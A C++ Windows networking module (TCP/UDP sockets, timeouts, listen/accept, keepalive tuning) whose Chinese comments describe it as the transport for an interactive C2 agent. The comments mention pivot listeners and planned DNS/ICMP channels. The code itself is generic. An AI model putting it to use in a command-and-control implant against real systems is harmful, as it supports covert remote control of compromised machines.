#include "Core/Comms/Platform/PlatformWin_Network.hpp"

// Windows-specific headers live only in implementation files.
// Order matters: winsock2.h must come before windows.h (WIN32_LEAN_AND_MEAN
// keeps windows.h from pulling in the legacy winsock.h which would
// redefine sockaddr etc).
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <mstcpip.h>

#include <cstring>
#include <stdexcept>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

namespace cleat {

    std::once_flag NetworkOpsWin::init_flag_;

    NetworkOpsWin::NetworkOpsWin() {
        // Initialize Winsock exactly once per process
        std::call_once(init_flag_, []() {
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                throw std::runtime_error("WSAStartup failed");
            }
            });
    }

    NetworkOpsWin::~NetworkOpsWin() {
        // Best-effort Winsock cleanup. Multiple instances share the same
        // WSA state; a static guard keeps cleanup single-shot.
        static bool cleanup_done = false;
        if (!cleanup_done) {
            WSACleanup();
            cleanup_done = true;
        }
    }

    // ---------- Socket lifecycle ----------
    INetworkOps::SocketHandle NetworkOpsWin::CreateTcpSocket() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            return -1;
        }
        // 禁用 Nagle: 小帧(心跳/命令)立即发出, 避免 ~40ms 延迟(交互类 C2 必需)
        BOOL nodelay = TRUE;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY,
            reinterpret_cast<const char*>(&nodelay), sizeof(nodelay));
        // 启用 TCP keepalive: 防空闲长连接被中间设备/系统按 KeepAliveTime(默认 2h)回收
        BOOL on = TRUE;
        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, reinterpret_cast<const char*>(&on), sizeof(on));
        // 短周期探测(30s 空闲探测 3 次): 无人值守长连接尽早探活, 不被路由器按会话超时(常 1-2h)掐断
        tcp_keepalive ka{};
        ka.onoff = 1;
        ka.keepalivetime = 30000;   // 30s 无流量开始探测
        ka.keepaliveinterval = 30000;
        DWORD bytesReturned = 0;
        WSAIoctl(sock, SIO_KEEPALIVE_VALS, &ka, sizeof(ka),
            nullptr, 0, &bytesReturned, nullptr, nullptr);
        return static_cast<SocketHandle>(sock);
    }

    void NetworkOpsWin::CloseSocket(SocketHandle sock) {
        if (sock != -1) {
            closesocket(static_cast<SOCKET>(sock));
        }
    }

    void NetworkOpsWin::AbortSocket(SocketHandle sock) {
        // Windows: closesocket 会唤醒阻塞 recv(返回 WSAENOTSOCK/错误), 无需先行 shutdown
        (void)sock;
    }

    // ---------- Connect ----------
    // 断线重连时主循环无法及时响应 Stop/降级切换)。超时后恢复阻塞模式并返回失败。
    bool NetworkOpsWin::ConnectSocket(SocketHandle sock, const std::string& host, uint16_t port) {
        SOCKET s = static_cast<SOCKET>(sock);
        if (s == INVALID_SOCKET) return false;

        struct addrinfo hints{}, * result = nullptr;
        hints.ai_family = AF_INET;          // IPv4 only for now
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        std::string port_str = std::to_string(port);
        if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &result) != 0) {
            return false;
        }

        // 非阻塞模式(select 超时驱动), 完成后恢复阻塞
        u_long nonblock = 1;
        ioctlsocket(s, FIONBIO, &nonblock);
        constexpr int kConnectTimeoutSec = 5;

        bool connected = false;
        for (auto* addr = result; addr != nullptr && !connected; addr = addr->ai_next) {
            const int rc = ::connect(s, addr->ai_addr, static_cast<int>(addr->ai_addrlen));
            if (rc == 0) {
                connected = true;
                break;
            }
            if (WSAGetLastError() != WSAEWOULDBLOCK) {
                continue;   // 立即失败, 尝试下一个地址
            }
            // 等待可写(连接完成)或超时
            fd_set wf;
            FD_ZERO(&wf);
            FD_SET(s, &wf);
            timeval tv{ kConnectTimeoutSec, 0 };
            const int sel = select(0, nullptr, &wf, nullptr, &tv);
            if (sel <= 0) {
                continue;   // 超时/被中断: 尝试下一个地址
            }
            int soerr = 0;
            int soerr_len = sizeof(soerr);
            if (getsockopt(s, SOL_SOCKET, SO_ERROR,
                reinterpret_cast<char*>(&soerr), &soerr_len) != 0 || soerr != 0) {
                continue;   // connect 被拒/网络不可达
            }
            connected = true;
        }

        u_long blocking = 0;
        ioctlsocket(s, FIONBIO, &blocking);
        freeaddrinfo(result);
        return connected;
    }

    // ---------- Data I/O ----------
    int NetworkOpsWin::SendSocket(SocketHandle sock, const void* data, size_t len) {
        if (len == 0) return 0;
        if (data == nullptr) return -1;

        SOCKET s = static_cast<SOCKET>(sock);
        const char* buffer = static_cast<const char*>(data);
        size_t total_sent = 0;

        while (total_sent < len) {
            int to_send = static_cast<int>(len - total_sent);
            int sent = ::send(s, buffer + total_sent, to_send, 0);
            if (sent == SOCKET_ERROR) {
                // Return what was already sent, or -1 if nothing
                return (total_sent > 0) ? static_cast<int>(total_sent) : -1;
            }
            if (sent == 0) {
                // Peer closed
                return static_cast<int>(total_sent);
            }
            total_sent += sent;
        }
        return static_cast<int>(total_sent);
    }

    int NetworkOpsWin::RecvSome(SocketHandle sock, void* buf, size_t len) {
        if (len == 0) return 0;
        if (buf == nullptr) return -1;
        // 单次 recv: 有数据即回(不凑满 len) —— 交互式短帧/中继必须用它
        return ::recv(static_cast<SOCKET>(sock), static_cast<char*>(buf),
            static_cast<int>(len), 0);
    }

    int NetworkOpsWin::RecvSocket(SocketHandle sock, void* buf, size_t len) {
        if (len == 0) return 0;
        if (buf == nullptr) return -1;

        SOCKET s = static_cast<SOCKET>(sock);
        char* buffer = static_cast<char*>(buf);
        size_t total_received = 0;

        while (total_received < len) {
            int to_recv = static_cast<int>(len - total_received);
            int received = ::recv(s, buffer + total_received, to_recv, 0);
            if (received == SOCKET_ERROR) {
                // Return what was already received, or -1 if nothing
                return (total_received > 0) ? static_cast<int>(total_received) : -1;
            }
            if (received == 0) {
                // Peer closed normally
                return static_cast<int>(total_received);
            }
            total_received += received;
        }
        return static_cast<int>(total_received);
    }

    // ---------- UDP datagram (Phase 3: DNS/ICMP 通道) ----------
    INetworkOps::SocketHandle NetworkOpsWin::CreateUdpSocket() {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) {
            return -1;
        }
        return static_cast<SocketHandle>(sock);
    }

    int NetworkOpsWin::SendTo(SocketHandle sock, const void* data, size_t len,
        const std::string& host, uint16_t port) {
        SOCKET s = static_cast<SOCKET>(sock);
        if (s == INVALID_SOCKET) return -1;

        struct addrinfo hints{};
        struct addrinfo* result = nullptr;
        hints.ai_family = AF_INET;          // IPv4 only for now
        hints.ai_socktype = SOCK_DGRAM;
        hints.ai_protocol = IPPROTO_UDP;

        std::string port_str = std::to_string(port);
        if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &result) != 0) {
            return -1;
        }
        // 仅取第一个解析地址; 多地址轮换留后续
        struct sockaddr_in addr{};
        memcpy(&addr, result->ai_addr, sizeof(addr));
        freeaddrinfo(result);

        return ::sendto(s, static_cast<const char*>(data), static_cast<int>(len), 0,
            reinterpret_cast<const sockaddr*>(&addr), sizeof(addr));
    }

    int NetworkOpsWin::RecvFrom(SocketHandle sock, void* buf, size_t len) {
        if (len == 0 || buf == nullptr) return -1;
        SOCKET s = static_cast<SOCKET>(sock);
        sockaddr_in from{};
        int from_len = sizeof(from);
        return ::recvfrom(s, static_cast<char*>(buf), static_cast<int>(len), 0,
            reinterpret_cast<sockaddr*>(&from), &from_len);
    }

    // ---------- Listen (pivot entry) ----------
    bool NetworkOpsWin::BindListen(SocketHandle sock, uint16_t port) {
        return BindListenOn(sock, port, "");
    }

    bool NetworkOpsWin::BindListenOn(SocketHandle sock, uint16_t port,
        const std::string& bind_host) {
        SOCKET s = static_cast<SOCKET>(sock);
        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        if (bind_host.empty() || bind_host == "0.0.0.0") {
            addr.sin_addr.s_addr = htonl(INADDR_ANY);
        } else {
            struct addrinfo hints{}, * result = nullptr;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_flags = AI_NUMERICHOST; // 仅接受字面 IP, 域名绑定无意义
            if (getaddrinfo(bind_host.c_str(), nullptr, &hints, &result) != 0
                || result == nullptr) {
                return false;
            }
            addr.sin_addr = reinterpret_cast<struct sockaddr_in*>(result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }
        if (bind(s, reinterpret_cast<const struct sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
            return false;
        }
        return listen(s, SOMAXCONN) != SOCKET_ERROR;
    }

    INetworkOps::SocketHandle NetworkOpsWin::AcceptSocket(SocketHandle listen_sock) {
        SOCKET c = accept(static_cast<SOCKET>(listen_sock), nullptr, nullptr);
        return (c == INVALID_SOCKET) ? -1 : static_cast<SocketHandle>(c);
    }

    bool NetworkOpsWin::ShutdownWrite(SocketHandle sock) {
        return shutdown(static_cast<SOCKET>(sock), SD_SEND) == 0;
    }

    // ---------- Timeout ----------
    bool NetworkOpsWin::SetSocketRecvTimeout(SocketHandle sock, int timeout_ms) {
        SOCKET s = static_cast<SOCKET>(sock);
        struct timeval tv {};
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int result = setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<const char*>(&tv), sizeof(tv));
        return (result == 0);
    }

    bool NetworkOpsWin::SetSocketTimeout(SocketHandle sock, int timeout_ms) {
        SOCKET s = static_cast<SOCKET>(sock);
        struct timeval tv {};
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int rc = setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<const char*>(&tv), sizeof(tv));
        int ws = setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<const char*>(&tv), sizeof(tv));
        return (rc == 0 && ws == 0);
    }

    // ---------- Byte order ----------
    uint32_t NetworkOpsWin::Hton32(uint32_t host_value) {
        return htonl(host_value);
    }

    // ---------- Errors ----------
    int NetworkOpsWin::GetLastSocketError() {
        return WSAGetLastError();
    }

    int NetworkOpsWin::GetSocketErrorTimeout() const {
        return WSAETIMEDOUT;
    }

    bool NetworkOpsWin::IsTransientRecvError(int err) const {
        // R6(修正版): 997=ERROR_IO_PENDING —— 阻塞 socket + SO_RCVTIMEO 的超时
        // 取消竞态会把它泄露给 WSAGetLastError(健康链路实测 1~2h 偶发一次),
        // 重试 recv 即恢复正常, 绝不可判死; 10035=WSAEWOULDBLOCK 同理。
        // 首版修复误把 997 当作 WSAEWOULDBLOCK 比较, 恒为假, 997 仍走致命分支。
        return err == ERROR_IO_PENDING || err == WSAEWOULDBLOCK;
    }

} // namespace cleat
